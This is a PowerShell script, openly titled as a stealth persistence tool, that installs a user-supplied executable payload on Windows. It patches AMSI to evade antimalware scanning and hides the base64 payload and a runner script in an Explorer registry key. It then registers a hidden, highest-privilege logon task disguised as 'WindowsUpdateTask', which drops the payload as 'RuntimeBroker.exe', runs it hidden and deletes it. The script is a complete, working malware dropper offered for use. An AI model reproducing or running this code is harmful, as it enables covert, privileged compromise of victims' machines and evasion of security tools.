# =============================================
# STEALTH PERSISTENCE (BASE64 VERSION)
# - AMSI bypass
# - No suspicious strings
# - Registry storage
# - Hidden scheduled task
# - Admin + User session interaction
# =============================================

# ---------- AMSI BYPASS ----------
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# ---------- CONFIG ----------
$k = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband"
$n1 = "UserData"       # stores base64 of EXE
$n2 = "RunScript"      # stores the runner script
$task = "WindowsUpdateTask"

if (!(Test-Path $k)) { New-Item $k -Force | Out-Null }

# ---------- YOUR BASE64 (paste it here) ----------
$b64 = ""   # <--- PASTE YOUR LONG BASE64 STRING HERE

# ---------- RUNNER SCRIPT (stored in registry) ----------
$runner = @'
Start-Sleep -Seconds 20
$r = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband' -Name UserData -ErrorAction Stop).UserData
$t = "$env:TEMP\RuntimeBroker.exe"
[IO.File]::WriteAllBytes($t, [Convert]::FromBase64String($r))

# Launch EXE as admin & interactive (inherits from scheduled task)
$p = Start-Process -FilePath $t -WindowStyle Hidden -PassThru

# Wait a moment for the process to initialize
Start-Sleep -Seconds 2

# Give the process a chance to run before cleaning up
Start-Sleep -Seconds 3
if (Test-Path $t) { Remove-Item $t -Force -ErrorAction SilentlyContinue }
'@

# ---------- STORE IN REGISTRY ----------
Set-ItemProperty -Path $k -Name $n1 -Value $b64
Set-ItemProperty -Path $k -Name $n2 -Value $runner

# ---------- ENCODED COMMAND (hides arguments) ----------
$cmd = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `$r=(Get-ItemProperty '$k').$n2; Invoke-Expression `$r"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

# ---------- SCHEDULED TASK ----------
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -EncodedCommand $enc"
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskName $task -User $env:USERNAME -RunLevel Highest -Force | Out-Null

Write-Host "[✔] Installation complete. Payload will run on next login (20s delay) with admin rights and user interaction." -ForegroundColor Green
